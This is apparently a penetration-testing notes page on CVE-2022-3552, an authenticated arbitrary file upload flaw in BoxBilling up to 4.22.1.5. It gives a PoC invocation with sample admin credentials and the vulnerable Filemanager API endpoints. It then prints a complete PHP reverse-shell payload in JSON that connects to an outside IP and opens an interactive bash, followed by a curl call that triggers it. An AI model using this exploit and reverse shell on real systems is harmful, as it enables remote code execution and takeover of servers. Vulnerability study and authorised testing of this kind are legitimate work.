# BoxBilling

[BoxBilling](https://docs.boxbilling.com/en/latest/index.html) is an open-source web application designed to facilitate automated client management, billing, and support services. Although primarily aimed at web hosting companies, it functions similarly to a lightweight CMS by offering modules for account handling, invoicing, and service provisioning through a web interface. The platform is **PHP-based**, supports integration with various payment gateways, and exposes multiple web-accessible endpoints, some of which interact directly with backend logic and server resources.

## Authenticated File Upload (RCE)

BoxBilling versions up to and including `4.22.1.5` that allows **authenticated administrators** to **upload files without proper validation**, including dangerous file types like PHP shells. The flaw resides in a hidden API endpoint that fails to restrict file type or enforce adequate sanitization . Once a payload is uploaded, execution occurs on the server side, **resulting in RCE with web‑server privileges**. A working is available (needs changing the hardcoded socket details in the revshell payload).

BoxBilling versions up to and including `4.22.1.5` are affected by an **authenticated file upload** vulnerability ([CVE-2022-3552](https://nvd.nist.gov/vuln/detail/CVE-2022-3552)) that **allows administrative users to upload arbitrary files** without any validation or restriction on file type. The vulnerability exists within the `Filemanager` API, which fails to enforce input sanitization or MIME filtering when writing data to disk. This flaw allows for the upload of malicious PHP payloads, **resulting in RCE** when the uploaded file is accessed via the web server.

A public [PoC](https://app.gitbook.com/o/asuXdppEfmgK9Dr478w0/s/mjLkek16kB60c2WFd5lf/) is available and works with minimal modification. Socket values (IP and port) must be updated within the reverse shell payload prior to use:

{% code overflow="wrap" %}
```bash
./CVE-2022-3552.py -d http://boxbilling.com -u admin@boxbilling.com -p Passw0rd123!
```
{% endcode %}

The vulnerability can also be exploited manually via a `POST` request to the endpoint:

```
/index.php?_url=/api/admin/Filemanager/save_file
```

The `data` parameter accepts raw PHP content as a string and writes it to a file in the web root. No restrictions are enforced, making it possible to directly implant a web/reverse shell. All double quotes within the payload must be escaped (`\"`), and unnecessary whitespace should be removed to ensure proper parsing. To confirm the upload path, the following endpoint can be queried ([BoxBilling Admin API Docs](https://docs.boxbilling.com/en/latest/reference/api-admin.html#admin-filemanager-get-list)):

```
/index.php?_url=/api/admin/Filemanager/get_list
```

Example payload (reverse shell), delivered via the API as JSON:

{% code overflow="wrap" %}
```json
{
  "order_id": 1,
  "data": "<?php set_time_limit (0);$VERSION = \"1.0\";$ip = '192.168.45.170';$port = 80;$chunk_size = 1400;$write_a = null;$error_a = null;$shell = 'uname -a; w; id; /bin/bash -i';$daemon = 0;$debug = 0;if (function_exists('pcntl_fork')) {$pid = pcntl_fork();if ($pid == -1) {exit(1);}if ($pid) {exit(0);}if (posix_setsid() == -1) {exit(1);}$daemon = 1;}chdir(\"/\");umask(0);$sock = fsockopen($ip, $port, $errno, $errstr, 30);if (!$sock) {exit(1);}$descriptorspec = array(0 => array(\"pipe\", \"r\"),1 => array(\"pipe\", \"w\"),2 => array(\"pipe\", \"w\"));$process = proc_open($shell, $descriptorspec, $pipes);if (!is_resource($process)) {exit(1);}stream_set_blocking($pipes[0], 0);stream_set_blocking($pipes[1], 0);stream_set_blocking($pipes[2], 0);stream_set_blocking($sock, 0);while (1) {if (feof($sock)) {break;}if (feof($pipes[1])) {break;}$read_a = array($sock, $pipes[1], $pipes[2]);$num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);if (in_array($sock, $read_a)) {$input = fread($sock, $chunk_size);fwrite($pipes[0], $input);}if (in_array($pipes[1], $read_a)) {$input = fread($pipes[1], $chunk_size);fwrite($sock, $input);}if (in_array($pipes[2], $read_a)) {$input = fread($pipes[2], $chunk_size);fwrite($sock, $input);}}fclose($sock);fclose($pipes[0]);fclose($pipes[1]);fclose($pipes[2]);proc_close($process); ?>",
  "path": "revshell.php"
}
```
{% endcode %}

Once successfully uploaded, the shell becomes accessible via a browser or CLI:

```bash
curl -s http://boxbilling.com/revshell.php
```
